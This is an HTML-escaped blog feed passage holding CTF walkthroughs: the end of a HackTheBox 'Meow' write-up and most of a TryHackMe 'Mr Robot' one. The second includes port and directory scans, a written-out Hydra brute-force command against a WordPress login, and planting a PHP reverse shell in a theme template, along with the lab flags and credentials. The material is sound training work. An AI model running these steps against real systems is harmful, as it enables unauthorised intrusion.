&lt;/code>&lt;/pre>&lt;h3 id="task-5-what-tool-do-we-use-to-test-our-connection-to-the-target">Task 5: What tool do we use to test our connection to the target?&lt;/h3>
&lt;pre tabindex="0">&lt;code>ping
&lt;/code>&lt;/pre>&lt;p>We might aswell just go and ping the box itself:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">weaponizedpeach@Akatosh:~$ ping 10.129.255.195
PING 10.129.255.195 &lt;span class="o">(&lt;/span>10.129.255.195&lt;span class="o">)&lt;/span> 56&lt;span class="o">(&lt;/span>84&lt;span class="o">)&lt;/span> bytes of data.
&lt;span class="m">64&lt;/span> bytes from 10.129.255.195: &lt;span class="nv">icmp_seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">18&lt;/span> &lt;span class="nv">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">63&lt;/span> &lt;span class="nv">time&lt;/span>&lt;span class="o">=&lt;/span>48.8 ms
&lt;span class="m">64&lt;/span> bytes from 10.129.255.195: &lt;span class="nv">icmp_seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">19&lt;/span> &lt;span class="nv">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">63&lt;/span> &lt;span class="nv">time&lt;/span>&lt;span class="o">=&lt;/span>48.6 ms
&lt;span class="m">64&lt;/span> bytes from 10.129.255.195: &lt;span class="nv">icmp_seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">20&lt;/span> &lt;span class="nv">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">63&lt;/span> &lt;span class="nv">time&lt;/span>&lt;span class="o">=&lt;/span>48.6 ms
&lt;span class="m">64&lt;/span> bytes from 10.129.255.195: &lt;span class="nv">icmp_seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">21&lt;/span> &lt;span class="nv">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">63&lt;/span> &lt;span class="nv">time&lt;/span>&lt;span class="o">=&lt;/span>49.1 ms
&lt;span class="m">64&lt;/span> bytes from 10.129.255.195: &lt;span class="nv">icmp_seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">22&lt;/span> &lt;span class="nv">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">63&lt;/span> &lt;span class="nv">time&lt;/span>&lt;span class="o">=&lt;/span>48.6 ms
&lt;span class="m">64&lt;/span> bytes from 10.129.255.195: &lt;span class="nv">icmp_seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">23&lt;/span> &lt;span class="nv">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">63&lt;/span> &lt;span class="nv">time&lt;/span>&lt;span class="o">=&lt;/span>48.8 ms
^C
--- 10.129.255.195 ping statistics ---
&lt;span class="m">23&lt;/span> packets transmitted, &lt;span class="m">6&lt;/span> received, 73.913% packet loss, &lt;span class="nb">time&lt;/span> 22720ms
rtt min/avg/max/mdev &lt;span class="o">=&lt;/span> 48.558/48.745/49.101/0.194 ms
weaponizedpeach@Akatosh:~$
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="task-6-what-is-the-name-of-the-tool-we-use-to-scan-the-targets-ports">Task 6: What is the name of the tool we use to scan the target&amp;rsquo;s ports?&lt;/h3>
&lt;pre tabindex="0">&lt;code>nmap
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s go and run a simple nmap scan:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">weaponizedpeach@Akatosh:~$ nmap 10.129.255.195
Starting Nmap 7.80 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2022-02-18 21:47 EET
Nmap scan report &lt;span class="k">for&lt;/span> 10.129.255.195
Host is up &lt;span class="o">(&lt;/span>0.048s latency&lt;span class="o">)&lt;/span>.
Not shown: &lt;span class="m">999&lt;/span> closed ports
PORT STATE SERVICE
23/tcp open telnet
Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 1.91 seconds
weaponizedpeach@Akatosh:~$
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="task-7-what-service-do-we-identify-on-port-23tcp-during-our-scans">Task 7: What service do we identify on port 23/tcp during our scans?&lt;/h3>
&lt;p>Nmap already identified the service for us:&lt;/p>
&lt;pre tabindex="0">&lt;code>telnet
&lt;/code>&lt;/pre>&lt;h3 id="task-8-what-username-ultimately-works-with-the-remote-management-login-prompt-for-the-target">Task 8: What username ultimately works with the remote management login prompt for the target?&lt;/h3>
&lt;p>For this we will need to establish a telnet connection to the machine: &lt;code>telnet MACHINE_IP&lt;/code>&lt;/p>
&lt;p>After a short period of time we are welcomed by a login screen:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">Trying 10.129.255.195...
Connected to 10.129.255.195.
Escape character is &lt;span class="s1">&amp;#39;^]&amp;#39;&lt;/span>.
█ █ ▐▌ ▄█▄ █ ▄▄▄▄
█▄▄█ ▀▀█ █▀▀ ▐▌▄▀ █ █▀█ █▀█ █▌▄█ ▄▀▀▄ ▀▄▀
█ █ █▄█ █▄▄ ▐█▀▄ █ █ █ █▄▄ █▌▄█ ▀▄▄▀ █▀█
Meow login:
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Since this is a introductory box, let&amp;rsquo;s just try &lt;code>root&lt;/code> as the login.&lt;/p>
&lt;pre tabindex="0">&lt;code>Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage
System information as of Fri 18 Feb 2022 08:04:01 PM UTC
...
...
...
Last login: Fri Feb 18 20:01:31 UTC 2022 on pts/0
root@Meow:~#
&lt;/code>&lt;/pre>&lt;p>Success!&lt;/p>
&lt;p>Thus, the answer to the question is:&lt;/p>
&lt;pre tabindex="0">&lt;code>root
&lt;/code>&lt;/pre>&lt;h3 id="submit-root-flag">Submit root flag&lt;/h3>
&lt;p>Since we have root access, this should be easy.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">root@Meow:~# ls
flag.txt snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~#
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And there&amp;rsquo;s our flag. The question wants the answer in the form &lt;code>HTB{_flag_}&lt;/code>&lt;/p>
&lt;p>Let&amp;rsquo;s try: &lt;code>HTB{b40abdfe23665f766f9c61ecba8a4c19}&lt;/code>&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 110;
flex-basis: 265px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-meow/pwned.png" data-size="695x628">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-meow/pwned.png"
width="695"
height="628"
srcset="https://weaponizedpeach.github.io/p/hackthebox-meow/pwned_hu35ce0124da75f468732e262427e21ac6_144909_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-meow/pwned_hu35ce0124da75f468732e262427e21ac6_144909_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Meow: Pwned">
&lt;/a>
&lt;figcaption>Meow: Pwned&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h2 id="outro">Outro&lt;/h2>
&lt;p>Although I am used to harder boxes, I was still interested what the Starting Point machines had to offer. I am glad that newcomers to HTB (and likely CTFs in general) have a place to ease into machines like this, rather than just diving into the deep end. I plan to make a write-up for each of the Starting Point machines.&lt;/p></description></item><item><title>TryHackMe: Mr Robot CTF</title><link>https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/</link><pubDate>Thu, 17 Feb 2022 15:50:05 +0200</pubDate><guid>https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/</guid><description>&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/cover.png" alt="Featured image of post TryHackMe: Mr Robot CTF" />&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>This time we&amp;rsquo;re breaking a machine from the &amp;ldquo;Mr Robot CTF&amp;rdquo; room &lt;a class="link" href="https://tryhackme.com/room/mrrobot" target="_blank" rel="noopener"
>over on TryHackMe&lt;/a>.&lt;/p>
&lt;h2 id="reconnaissance">Reconnaissance&lt;/h2>
&lt;p>The room itself on TryHackMe does not give much to go on, apart from the fact that the machine itself is inspired by the show &lt;a class="link" href="https://www.imdb.com/title/tt4158110/" target="_blank" rel="noopener"
>Mr. Robot&lt;/a>.&lt;/p>
&lt;h2 id="scanning--discovery">Scanning &amp;amp; Discovery&lt;/h2>
&lt;h3 id="rustscan">RustScan&lt;/h3>
&lt;p>I decided to use I&amp;rsquo;ve heard a bunch about - &lt;a class="link" href="https://github.com/RustScan/RustScan" target="_blank" rel="noopener"
>RustScan&lt;/a>. It pins down open ports much more efficiently, cutting down the amount of time needed for, say, a full port scan on a box.&lt;/p>
&lt;p>For starters, let&amp;rsquo;s go with an initial scan:&lt;/p>
&lt;pre tabindex="0">&lt;code>.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
--------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
[~] The config file is expected to be at &amp;quot;/home/rustscan/.rustscan.toml&amp;quot;
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.172.225:80
Open 10.10.172.225:443
[~] Starting Script(s)
[&amp;gt;] Script to be run Some(&amp;quot;nmap -vvv -p {{port}} {{ip}}&amp;quot;)
[~] Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-09 21:24 UTC
Initiating Ping Scan at 21:24
Scanning 10.10.172.225 [2 ports]
Completed Ping Scan at 21:24, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:24
Completed Parallel DNS resolution of 1 host. at 21:24, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:24
Scanning 10.10.172.225 [2 ports]
Discovered open port 443/tcp on 10.10.172.225
Discovered open port 80/tcp on 10.10.172.225
Completed Connect Scan at 21:24, 0.05s elapsed (2 total ports)
Nmap scan report for 10.10.172.225
Host is up, received syn-ack (0.054s latency).
Scanned at 2022-02-09 21:24:42 UTC for 0s
PORT STATE SERVICE REASON
80/tcp open http syn-ack
443/tcp open https syn-ack
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
&lt;/code>&lt;/pre>&lt;h3 id="whatweb">whatweb&lt;/h3>
&lt;p>Whatweb did not tell me much, apart that the box is running on some version of Apache.
&lt;code>http://10.10.111.68 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.111.68], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]&lt;/code>&lt;/p>
&lt;h3 id="browser">Browser&lt;/h3>
&lt;p>It seems we have a web server, both HTTP and HTTPS, let&amp;rsquo;s check it out.&lt;/p>
&lt;p>While the website itself is very elaborate for a pentesting machine, going along with the &amp;lsquo;terminal&amp;rsquo; didn&amp;rsquo;t really lead me anywhere productive.&lt;/p>
&lt;p>There doesn&amp;rsquo;t seem to be a difference functionality-wise whether I accessed it via HTTP or HTTPS. The self-signed SSL certificate file doesn&amp;rsquo;t leak any subdomains.&lt;/p>
&lt;p>&lt;code>/sitemap.xml&lt;/code> doesn&amp;rsquo;t give anything at all.&lt;/p>
&lt;p>&lt;code>/robots.txt&lt;/code> is very promising, however:
&lt;figure
class="gallery-image"
style="
flex-grow: 207;
flex-basis: 497px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robots.txt.png" data-size="116x56">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robots.txt.png"
width="116"
height="56"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robots.txt_hub1e29886086db96297708c1e8a1f287a_3523_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robots.txt_hub1e29886086db96297708c1e8a1f287a_3523_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="robots.txt">
&lt;/a>
&lt;figcaption>robots.txt&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Sure enough, /key-1-of-3.txt leads us to the first key for this CTF: &lt;code>073403c8a58a1f80d943455fb30724b9&lt;/code>
&lt;figure
class="gallery-image"
style="
flex-grow: 1078;
flex-basis: 2587px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/key1.png" data-size="248x23">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/key1.png"
width="248"
height="23"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/key1_hu9e8510997529079783b598ca2dcd79b8_3837_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/key1_hu9e8510997529079783b598ca2dcd79b8_3837_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="/key-1-of-3.txt">
&lt;/a>
&lt;figcaption>/key-1-of-3.txt&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>The &lt;code>/fsocity.dic&lt;/code> seems to be a dictionary file of sorts, line seperated, one entry per line. Might prove useful later.&lt;/p>
&lt;p>Skimming through the source code of the website clues me into that this is actually a Wordpress site, even though it doesn&amp;rsquo;t look like it. Specifically, links to &lt;code>wp-content&lt;/code> and &lt;code>https://wordpress.org/&lt;/code>&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 451;
flex-basis: 1083px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/wordpress_source_code.png" data-size="1345x298">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/wordpress_source_code.png"
width="1345"
height="298"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/wordpress_source_code_hu3a31b79307d06bd1629f154c8c2b8918_27946_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/wordpress_source_code_hu3a31b79307d06bd1629f154c8c2b8918_27946_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="WordPress source code">
&lt;/a>
&lt;figcaption>WordPress source code&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h3 id="feroxbuster">feroxbuster&lt;/h3>
&lt;p>Since we now know this is a WordPress site, we know it is a Content Management System (CMS). There should be a dashboard somewhere for content management, which coincidentally (especially on WordPress) often has opportunities for remote code execution (RCE).&lt;/p>
&lt;p>Trying to simply go to &lt;code>/admin&lt;/code> puts us into a redirect loop, not leading us anywhere.&lt;/p>
&lt;p>Try to crack open the big guns and do a directory scan with &lt;a class="link" href="https://github.com/epi052/feroxbuster" target="_blank" rel="noopener"
>feroxbuster&lt;/a>. Similar to RustScan, this tool is also written in Rust. I like how it can scan a list of directories in parallel, making it faster. I used &lt;code>directory_list-2.3-big&lt;/code> from &lt;a class="link" href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener"
>SecLists&lt;/a>.&lt;/p>
&lt;pre tabindex="0">&lt;code>301 GET 7l 20w 234c http://10.10.172.225/blog =&amp;gt; http://10.10.172.225/blog/
301 GET 7l 20w 236c http://10.10.172.225/images =&amp;gt; http://10.10.172.225/images/
200 GET 0l 0w 0c http://10.10.172.225/sitemap
302 GET 0l 0w 0c http://10.10.172.225/login =&amp;gt; http://10.10.172.225/wp-login.php
301 GET 0l 0w 0c http://10.10.172.225/rss =&amp;gt; http://10.10.172.225/feed/
301 GET 0l 0w 0c http://10.10.172.225/images/rss =&amp;gt; http://10.10.172.225/images/feed/
301 GET 0l 0w 0c http://10.10.172.225/blog/rss =&amp;gt; http://10.10.172.225/blog/feed/
301 GET 7l 20w 235c http://10.10.172.225/video =&amp;gt; http://10.10.172.225/video/
301 GET 0l 0w 0c http://10.10.172.225/0 =&amp;gt; http://10.10.172.225/0/
301 GET 0l 0w 0c http://10.10.172.225/feed =&amp;gt; http://10.10.172.225/feed/
301 GET 0l 0w 0c http://10.10.172.225/image =&amp;gt; http://10.10.172.225/image/
301 GET 0l 0w 0c http://10.10.172.225/atom =&amp;gt; http://10.10.172.225/feed/atom/
301 GET 0l 0w 0c http://10.10.172.225/images/feed =&amp;gt; http://10.10.172.225/images/feed/
301 GET 0l 0w 0c http://10.10.172.225/blog/feed =&amp;gt; http://10.10.172.225/blog/feed/
301 GET 0l 0w 0c http://10.10.172.225/video/rss =&amp;gt; http://10.10.172.225/video/feed/
301 GET 7l 20w 240c http://10.10.172.225/wp-content =&amp;gt; http://10.10.172.225/wp-content/
301 GET 7l 20w 235c http://10.10.172.225/admin =&amp;gt; http://10.10.172.225/admin/
301 GET 0l 0w 0c http://10.10.172.225/images/atom =&amp;gt; http://10.10.172.225/images/feed/atom/
301 GET 0l 0w 0c http://10.10.172.225/blog/atom =&amp;gt; http://10.10.172.225/blog/feed/atom/
301 GET 0l 0w 0c http://10.10.172.225/0/rss =&amp;gt; http://10.10.172.225/0/feed/
301 GET 0l 0w 0c http://10.10.172.225/feed/rss =&amp;gt; http://10.10.172.225/feed/
200 GET 30l 98w 1188c http://10.10.172.225/admin/index
301 GET 7l 20w 242c http://10.10.172.225/admin/images =&amp;gt; http://10.10.172.225/admin/images/
301 GET 7l 20w 235c http://10.10.172.225/audio =&amp;gt; http://10.10.172.225/audio/
200 GET 2028l 11941w 516314c http://10.10.172.225/intro
301 GET 7l 20w 248c http://10.10.172.225/wp-content/uploads =&amp;gt; http://10.10.172.225/wp-content/uploads/
301 GET 7l 20w 246c http://10.10.172.225/images/headlines =&amp;gt; http://10.10.172.225/images/headlines/
&lt;/code>&lt;/pre>&lt;p>We get back a lot of directories. The one that stands out to me the most is http://10.10.172.225/wp-login.php, let&amp;rsquo;s check it out.&lt;/p>
&lt;h3 id="browser-wp-loginphp-12">Browser: /wp-login.php (1/2)&lt;/h3>
&lt;p>Here we get a nice, typical WordPress login page. I will admit I was stuck here for a long time, not knowing how to proceed. the &lt;code>readme.html&lt;/code> file doesn&amp;rsquo;t leak any info about the WordPress version.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 1748;
flex-basis: 4196px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/readme.html.png" data-size="542x31">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/readme.html.png"
width="542"
height="31"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/readme.html_hu94944168b174434e586e09d27d5f543c_6562_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/readme.html_hu94944168b174434e586e09d27d5f543c_6562_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="readme.html">
&lt;/a>
&lt;figcaption>readme.html&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Trying to attack the form itself via sqlmap was also unsuccessful.&lt;/p>
&lt;h3 id="wpscan">WPScan&lt;/h3>
&lt;pre tabindex="0">&lt;code>_______________________________________________________________
__ _______ _____
\ \ / / __ \ / ____|
\ \ /\ / /| |__) | (___ ___ __ _ _ __ ®
\ \/ \/ / | ___/ \___ \ / __|/ _` | '_ \
\ /\ / | | ____) | (__| (_| | | | |
\/ \/ |_| |_____/ \___|\__,_|_| |_|
WordPress Security Scanner by the WPScan Team
Version 3.8.17
Sponsored by Automattic - https://automattic.com/
@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[+] URL: http://10.10.111.68/wp-login.php/ [10.10.111.68]
[+] Started: Thu Feb 10 00:45:08 2022
Interesting Finding(s):
[+] Headers
| Interesting Entries:
| - Server: Apache
| - X-Powered-By: PHP/5.5.29
| - X-Mod-Pagespeed: 1.9.32.3-4523
| Found By: Headers (Passive Detection)
| Confidence: 100%
[+] WordPress readme found: http://10.10.111.68/wp-login.php/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
[+] This site seems to be a multisite
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| Reference: http://codex.wordpress.org/Glossary#Multisite
[+] The external WP-Cron seems to be enabled: http://10.10.111.68/wp-login.php/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
| - https://www.iplocation.net/defend-wordpress-from-ddos
| - https://github.com/wpscanteam/wpscan/issues/1299
[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
| Found By: Query Parameter In Install Page (Aggressive Detection)
| - http://10.10.111.68/wp-includes/css/buttons.min.css?ver=4.3.1
| - http://10.10.111.68/wp-includes/css/dashicons.min.css?ver=4.3.1
| Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
| - http://10.10.111.68/wp-includes/css/buttons.min.css?ver=4.3.1
| - http://10.10.111.68/wp-includes/css/dashicons.min.css?ver=4.3.1
|
| [!] 86 vulnerabilities identified:
| ...
| ...
| ...
[i] The main theme could not be detected.
[i] No plugins Found.
[i] No Config Backups Found.
[+] WPScan DB API OK
| Plan: free
| Requests Done (during the scan): 1
| Requests Remaining: 24
[+] Finished: Thu Feb 10 00:45:15 2022
[+] Requests Done: 142
[+] Cached Requests: 184
[+] Data Sent: 38.716 KB
[+] Data Received: 108.936 KB
[+] Memory used: 195.27 MB
[+] Elapsed time: 00:00:07
&lt;/code>&lt;/pre>&lt;p>&lt;code>[!] 86 vulnerabilities identified&lt;/code>&lt;/p>
&lt;p>Now that is a lot. Unfortunately, many required authentication, which we didn&amp;rsquo;t have (yet). Many were focused on XSS, which also isn&amp;rsquo;t super useful for this CTF format. The ones that focused on RCE depended on plugins that this site did not have.&lt;/p>
&lt;p>Maybe I was thinking about this too hard.&lt;/p>
&lt;h3 id="browser-wp-loginphp-22">Browser: /wp-login.php (2/2)&lt;/h3>
&lt;p>It&amp;rsquo;s time to come back to the &lt;code>fsocity.dic&lt;/code> file, given it does look as a possible username &amp;amp; password list. However, given the 7MB size and 858160 entries in this file, trying to both find a viable username AND the password for it would have taken forever.&lt;/p>
&lt;p>I did more research about the show (Mr. Robot) the box is based on. I tried out several usernames. Fortunately, WordPress leaks viable usernames, by giving a different prompt if the username exists. &lt;code>Elliot&lt;/code> is one of them.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 88;
flex-basis: 211px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/elliot_incorrect_pass.png" data-size="335x380">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/elliot_incorrect_pass.png"
width="335"
height="380"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/elliot_incorrect_pass_huc477a72cf2038ddf8563568e37f3ce00_15278_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/elliot_incorrect_pass_huc477a72cf2038ddf8563568e37f3ce00_15278_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Possible Username">
&lt;/a>
&lt;figcaption>Possible Username&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Now that we have a possible username, let&amp;rsquo;s try to determine the password.&lt;/p>
&lt;h3 id="hydra">Hydra&lt;/h3>
&lt;p>With username and wordlist in hand, let&amp;rsquo;s start up Hydra and try to figure out the password:&lt;/p>
&lt;pre tabindex="0">&lt;code>hydra -l Elliot -P ../downloads/fsocity.dic 10.10.111.68 -V http-post-form '/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=http%3A%2F%2F10.10.111.68%2Fwp-admin%2F&amp;amp;testcookie=1:S=Location
&lt;/code>&lt;/pre>&lt;p>Eventually, we get a hit. Time to login.&lt;/p>
&lt;pre tabindex="0">&lt;code>[80][http-post-form] host: 10.10.111.68 login: Elliot password: ER28-0652
&lt;/code>&lt;/pre>&lt;h2 id="exploitation">Exploitation&lt;/h2>
&lt;h3 id="browser-wp-loginphp-admin-dashboard">Browser: /wp-login.php (Admin dashboard)&lt;/h3>
&lt;p>Upon logging in we are greeted with a dashboard.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 364;
flex-basis: 875px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/admin_panel.png" data-size="1904x522">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/admin_panel.png"
width="1904"
height="522"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/admin_panel_hu86e1845e2984a11d62250e5340274e51_51547_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/admin_panel_hu86e1845e2984a11d62250e5340274e51_51547_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Admin Dashboard">
&lt;/a>
&lt;figcaption>Admin Dashboard&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>The plugins section had a bunch of plugins, but none seemed to have exploitation opportunities. Fortunately, going to &lt;code>Appearance -&amp;gt; Editor&lt;/code> allows us to edit various page templates. This is a great place to insert some malicious code and possibly get a reverse shell. I hopped onto &lt;a class="link" href="https://www.revshells.com/" target="_blank" rel="noopener"
>RevShells&lt;/a> and grabbed a PHP reverse shell script. I inserted it into the &amp;ldquo;404 Template&amp;rdquo;, as it seemed to easiest to exploit.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 243;
flex-basis: 584px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/revshell.png" data-size="1897x779">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/revshell.png"
width="1897"
height="779"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/revshell_hu8ad8d4ec8b4becee3f276e1a08c6f6b1_145526_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/revshell_hu8ad8d4ec8b4becee3f276e1a08c6f6b1_145526_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Template Editor">
&lt;/a>
&lt;figcaption>Template Editor&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Let&amp;rsquo;s save it and try to provoke a 404 response.
&lt;figure
class="gallery-image"
style="
flex-grow: 358;
flex-basis: 860px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/revshell_set-up.png" data-size="172x48">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/revshell_set-up.png"
width="172"
height="48"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/revshell_set-up_hufe22fa74fe4b01ff2adbd1e8268d4e31_2294_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/revshell_set-up_hufe22fa74fe4b01ff2adbd1e8268d4e31_2294_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="404 Template with Reverse Shell saved">
&lt;/a>
&lt;figcaption>404 Template with Reverse Shell saved&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>I set-up my netcat listener and went to a gibberish URL hoping the 404 template would kick in and with it, the reverse shell script.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 331;
flex-basis: 795px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/user_access.png" data-size="1044x315">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/user_access.png"
width="1044"
height="315"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/user_access_hu9e5e27115eb395430461b6cdbdeecf53_244841_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/user_access_hu9e5e27115eb395430461b6cdbdeecf53_244841_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="User Access">
&lt;/a>
&lt;figcaption>User Access&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>And it worked!&lt;/p>
&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
&lt;h3 id="horizontal-escalation-robot">Horizontal Escalation (robot)&lt;/h3>
&lt;p>Unfortunately, we don&amp;rsquo;t seem to have a lot of permissions to pretty much anything with this user. Let&amp;rsquo;s snoop around the &lt;code>/home&lt;/code> directory.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 142;
flex-basis: 340px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/password_hash.png" data-size="385x271">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/password_hash.png"
width="385"
height="271"
